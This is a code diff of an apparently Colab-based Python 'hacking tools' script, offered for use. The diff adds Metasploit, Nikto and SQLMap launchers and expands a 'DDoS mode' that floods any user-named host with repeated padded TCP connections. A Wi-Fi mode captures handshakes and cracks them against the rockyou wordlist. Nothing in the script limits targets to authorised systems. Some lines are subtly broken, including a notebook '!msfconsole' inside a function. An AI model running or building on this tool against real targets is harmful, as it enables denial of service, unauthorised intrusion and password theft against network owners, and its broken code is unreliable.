@@ -1,7 +1,8 @@
-!apt-get update
-!apt-get install nmap -y
-!pip install python-whois
-!pip install dnspython
+print("\n[*] Installing Metasploit Framework...")
+!curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+!chmod +x msfinstall
+!sudo ./msfinstall
+
 import requests
 import socket
 import whois
@@ -17,27 +18,25 @@ from urllib.parse import urlparse
 import csv
 import signal
 
-
 USE_COLOR = True  # set to False for plain text
 
 CYAN = "\033[96m" if USE_COLOR else ""
 GREEN = "\033[92m" if USE_COLOR else ""
 RESET = "\033[0m" if USE_COLOR else ""
 
-USE_COLOR = True  # set to False for plain text
+logo = fr"""
+{CYAN}
 
-CYAN = "\033[96m" if USE_COLOR else ""
-GREEN = "\033[92m" if USE_COLOR else ""
-RESET = "\033[0m" if USE_COLOR else ""
+  ░██████            ░██        ░██   ░██
+ ░██   ░██           ░██              ░██
+░██     ░██ ░██░████ ░████████  ░██░████████
+░██     ░██ ░███     ░██    ░██ ░██   ░██
+░██     ░██ ░██      ░██    ░██ ░██   ░██
+ ░██   ░██  ░██      ░███   ░██ ░██   ░██
+  ░██████   ░██      ░██░█████  ░██    ░████
 
-logo = f"""
-{CYAN} _____  ___    _______  ___________  ________  _______   ______
-("   \\|"  \\  /"     "|("     _   ")/"       )/"     "| /" _  "\
-|.\\   \\    |(: ______) )__/  \\__/(:   \\___/(: ______)(: ( \\___)
-|: \\.   \\\\  | \\/    |      \\_ /    \\___  \\   \\/    |   \\/ \\
-|.  \\    \\. | // ___)_     |.  |     __/  \\\\  // ___)_  //  \\ _
-|    \\    \\ |(:      "|    \\:  |    /" \\   :)(:      "|(:   _) \\
- \\___|\\____\\) \\_______)     \\__|   (_______/  \\_______) \\_______)
+
+
 
 {RESET}
 {GREEN}           NETWORK SECURITY TOOLKIT{RESET}
@@ -282,7 +281,7 @@ def nmap_scan(target):
         write("Invalid Nmap scan choice, performing default SYN scan.")
         nmap_args = ["-sS"]
 
-    cmd = ["nmap"] + nmap_args + [target]
+    cmd = ["nmap", target] + nmap_args
     write(f"Running Nmap command: {' '.join(cmd)}")
     try:
         proc = subprocess.run(cmd, capture_output=True, text=True, check=False)
@@ -314,25 +313,49 @@ def nmap_scan(target):
     except Exception as e:
         write(f"An unexpected error occurred during Nmap scan: {e}")
 
+# ================= NIKTO SCAN =================
+
+def nikto_scan(target):
+    write("\n[NIKTO SCAN]")
+    try:
+        # Nikto requires a full URL or hostname
+        if not target.startswith("http://") and not target.startswith("https://"):
+            target = "http://" + target # Default to http if no scheme specified
+
+        # Ensure Nikto is run with the host parameter
+        cmd = ["nikto", "-h", target]
+        write(f"Running Nikto command: {' '.join(cmd)}")
+
+        proc = subprocess.run(cmd, capture_output=True, text=True, check=False)
+
+        write("\n--- Nikto Output ---")
+        if proc.stdout:
+            write(proc.stdout.strip())
+            # Basic heuristic for confidence: Nikto typically finds something if successful
+            if "0 host(s) tested" not in proc.stdout and "No web server found" not in proc.stdout:
+                add_confidence(3)
+        if proc.stderr:
+            write("\n--- Nikto Errors ---")
+            write(proc.stderr.strip())
+            # Nikto often prints informational messages to stderr, so not always an error
+            if "ERROR" in proc.stderr.upper() or "FAILED" in proc.stderr.upper():
+                add_confidence(-1)
+
+    except FileNotFoundError:
+        write("Nikto command not found. Please ensure Nikto is installed and in your system's PATH.")
+    except Exception as e:
+        write(f"An unexpected error occurred during Nikto scan: {e}")
+
 # ================= DDOS FUNCTIONALITY =================
 
-def dos(host, ip, port, message):
+def dos(host, ip, port, message_bytes):
     ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        # Attempt to connect to the specified host and port
         ddos.connect((ip, int(port)))
-        # Send messages
-        ddos.send(message.encode())
-        # Also send using sendto (UDP, but SOCK_STREAM is TCP, might not behave as intended)
-        # For a simple demo, keeping as is, but typically one would choose TCP or UDP.
-        # If the socket is SOCK_STREAM (TCP), sendto might not be appropriate for established connection.
-        # Original code used `ddos.sendto(message.encode(), (ip, int(port)))` with a TCP socket,
-        # which is redundant or incorrect for a connected TCP socket.
-        # Removed for correctness of TCP; if UDP is intended, socket type should be SOCK_DGRAM.
-        # For the purpose of DDoS simulation, simply sending over the established TCP connection is sufficient.
-        ddos.send(message.encode())
-        write(f"|[DDoS Packet Sent to {host}:{port}]|")
-        add_confidence(0.5) # Small confidence for each packet sent
+        ddos.send(message_bytes)
+        ddos.send(message_bytes)
+        write(f"|[DDoS Packet Sent ({len(message_bytes)} bytes) to {host}:{port}]|")
+        add_confidence(0.5)
     except socket.error as msg:
         write(f"|[Connection Failed to {host}:{port}]| - {msg}")
     except Exception as e:
@@ -345,7 +368,8 @@ def ddos_mode():
     while True:
         host_input = input("Site you want to target (e.g., example.com or http://example.com): ").strip()
         port_str = input("Port you want to attack (e.g., 80): ").strip()
-        message = input("Input the message you want to send (e.g., 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'): ").strip()
+        message_content = input("Input the message content (e.g., 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'): ").strip()
+        message_length_str = input("Desired message length in bytes (optional, leave blank to use content length): ").strip()
         conn_str = input("How many connections/packets you want to attempt: ").strip()
 
         if not host_input or not port_str.isdigit() or not conn_str.isdigit():
@@ -355,30 +379,43 @@ def ddos_mode():
         port = int(port_str)
         num_connections = int(conn_str)
 
+        final_message = message_content.encode()
+        if message_length_str.isdigit():
+            desired_length = int(message_length_str)
+            current_length = len(final_message)
+            if current_length < desired_length:
+                # Pad with null bytes or spaces to reach desired length
+                padding = b'\x00' * (desired_length - current_length)
+                final_message = final_message + padding
+                write(f"Message padded to {len(final_message)} bytes.")
+            elif current_length > desired_length:
+                # Truncate message
+                final_message = final_message[:desired_length]
+                write(f"Message truncated to {len(final_message)} bytes.")
+
         try:
             parsed_url = urlparse(host_input)
-            # Use hostname from parsed URL if available, otherwise assume host_input is hostname/IP
             host = parsed_url.hostname if parsed_url.hostname else host_input
 
             ip = socket.gethostbyname(host)
             write(f"Target resolved to IP: {ip}")
-            write(f"Attempting {num_connections} connections to {host} on port {port}")
+            write(f"Attempting {num_connections} connections to {host} on port {port} with message size {len(final_message)} bytes.")
             write("+----------------------------+")
 
             for i in range(num_connections):
-                dos(host, ip, port, message)
-                time.sleep(0.01) # Small delay to prevent overwhelming local resources
+                dos(host, ip, port, final_message)
+                time.sleep(0.01)
 
             write("+----------------------------+")
-            write(f"The requested {num_connections} connections finished.")
-            add_confidence(5) # Add significant confidence for completing a DDoS attempt
+            write(f"The requested {num_connections} connections finished, sending {num_connections * len(final_message)} bytes in total.")
+            add_confidence(5)
 
         except socket.gaierror:
             write(f"Could not resolve hostname: {host_input}. Please check the domain or IP address.")
         except Exception as e:
             write(f"An unexpected error occurred during DDoS mode operation: {e}")
 
-        answer = input("Do you want to send more connections? (y/n): ").strip().lower()
+        answer = input("Do you want to send more connections? (y/n):").strip().lower()
         if answer not in ["y", "yes"]:
             break
     write("=== DDoS MODE END ===")
@@ -392,8 +429,8 @@ def download_wordlist():
     if not os.path.exists("rockyou.txt"):
         write("[*] Downloading rockyou.txt...")
         # Use !curl for Colab shell command execution
-        subprocess.run(f"curl -L {ROCKYOU_URL} -o rockyou.txt", shell=True)
-    return "rockyou.txt"
+        subprocess.run(f"curl -L {ROCKYOU_URL} -o {curdir}/rockyou.txt", shell=True)
+    return f"{curdir}/rockyou.txt"
 
 def cleanup_old_files():
     write("[*] Cleaning up old capture files...")
@@ -523,7 +560,7 @@ def wifi_audit_mode():
     write("\n[!] Press Ctrl+C in THIS CELL to stop packet capture and start cracking.")
     try:
         # Keep the script running to allow user to monitor airodump-ng output
-        # and press Ctrl+C when handshake is captured.
+        # and press Ctrl+C when handshake is captured.n
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
@@ -548,13 +585,64 @@ def wifi_audit_mode():
             add_confidence(10)
         else:
             write("\n[i] Password not found in wordlist.")
-            add_confidence(-5) # Deduct if crack fails
+            add_confidence(-5)
     else:
         write(f"Error: Capture file {cap_file_path} not found. Handshake might not have been captured.")
         add_confidence(-2)
 
     write("=== WI-FI AUDIT MODE END ===")
 
+# ================= SQLMAP =================
+
+def sqlmap_scan():
+    write("\n[SQLMAP SCAN]")
+    target_url = input("Enter target URL for SQLMap scan (e.g., http://example.com/vuln?id=1): ").strip()
+
+    if not target_url:
+        write("Target URL cannot be empty. Returning to menu.")
+        return
+
+    custom_options_str = input("Enter custom SQLMap options (e.g., --dbs --level 5 --risk 3): ").strip()
+    custom_options = custom_options_str.split() if custom_options_str else []
+
+    write(f"Running SQLMap scan against: {target_url}")
+    write(f"With custom options: {' '.join(custom_options)}")
+    try:
+        # -u specifies the target URL
+        # --batch means never ask for user input, use default behavior
+        # --random-agent to use a random User-Agent header
+        cmd = ["sqlmap", "-u", target_url, "--batch", "--random-agent"] + custom_options
+        subprocess.run(cmd, check=True, text=True)
+        write("SQLMap scan completed.")
+        add_confidence(7)
+    except FileNotFoundError:
+        write("Error: 'sqlmap' command not found. Please ensure SQLMap is installed and in your PATH.")
+        add_confidence(-5)
+    except subprocess.CalledProcessError as e:
+        write(f"Error running SQLMap: {e}")
+        write(f"SQLMap output (stderr): {e.stderr})")
+        write(f"SQLMap output (stdout): {e.stdout})")
+        add_confidence(-3)
+    except Exception as e:
+        write(f"An unexpected error occurred during SQLMap scan: {e}")
+
+# ================= METASPLOIT FUNCTION =================
+
+def metasploit_mode():
+    write("\n[METASPLOIT MODE]")
+    write("Launching msfconsole. This may take a moment...")
+    !msfconsole
+    try:
+        subprocess.run(["msfconsole"], check=False)
+        write("msfconsole session ended.")
+        add_confidence(5)
+    except FileNotFoundError:
+        write("Error: 'msfconsole' command not found. Please ensure Metasploit Framework is installed and in your PATH.")
+        add_confidence(-5)
+    except Exception as e:
+        write(f"An unexpected error occurred while launching msfconsole: {e}")
+        add_confidence(-3)
+        
 # ================= EXPORT =================
 
 def export_report():
@@ -590,12 +678,15 @@ def export_report():
 # ================= MENU =================
 
 def menu():
-    print("\nNetsec Labs Network Hacking Tools Made by Ajay Easwarachandran")
+    print("\nOrbit Hacking Tools Made by Ajay Easwarachandran")
     print("1) OSINT Mode")
     print("2) Nmap Scan")
-    print("3) DDoS Mode")
-    print("4) Wi-Fi Audit Mode")
-    print("5) Export Report")
+    print("3) Nikto Scan")
+    print("4) DDoS Mode")
+    print("5) Wi-Fi Audit Mode")
+    print("6) SQLMap Scan")
+    print("7) Metasploit Mode")
+    print("8) Export Report")
     print("0) Exit")
 
 while True:
@@ -606,8 +697,8 @@ while True:
         write("Exiting Orbit Network Tools.")
         break
 
-    # Reset session for new operations, but not for Wi-Fi Audit or exporting reports
-    if choice not in ["4", "5"]:
+    # Reset session for new tool modes, but not for export
+    if choice not in ["8", "0"]:
         reset_session()
 
     if choice == "1":
@@ -623,10 +714,20 @@ while True:
         else:
             write("Target cannot be empty. Returning to menu.")
     elif choice == "3":
-        ddos_mode()
+        target = input("Enter URL or domain for Nikto scan: ").strip()
+        if target:
+            nikto_scan(target)
+        else:
+            write("Target cannot be empty. Returning to menu.")
     elif choice == "4":
-        wifi_audit_mode()
+        ddos_mode()
     elif choice == "5":
+        wifi_audit_mode()
+    elif choice == "6": # New SQLMap Scan option
+        sqlmap_scan()
+    elif choice == "7": # Metasploit Mode
+        metasploit_mode()
+    elif choice == "8":
         export_report()
     else:
-        write("Invalid option. Choose from the fucking menu dumbass.")
+        write("Invalid option. Choose from the menu dingus.")
